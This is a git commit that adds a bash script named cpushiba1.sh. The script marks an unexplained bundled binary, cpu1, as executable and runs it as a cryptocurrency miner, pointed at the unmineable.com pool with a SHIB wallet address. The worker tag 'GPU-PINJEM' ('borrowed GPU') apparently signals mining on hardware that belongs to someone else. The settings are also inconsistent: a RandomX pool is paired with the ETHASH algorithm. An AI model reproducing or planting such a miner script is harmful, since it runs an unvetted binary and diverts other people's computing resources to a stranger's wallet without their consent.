53bd1ae5265dc73311d10ad7609d9d10f69eab99
yuliantiriyanti6 <88493189+yuliantiriyanti6@users.noreply.github.com>
2021-08-12 01:16:38 +0700

    Create cpushiba1.sh

---
+++ cpushiba1.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+
+POOL=rx.unmineable.com:3333
+
+WALLET=SHIB:0xf932e7CD10E3bDa943916024358951b6C5c06F02
+
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
+
+chmod +x cpu1
+
+./cpu1 --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
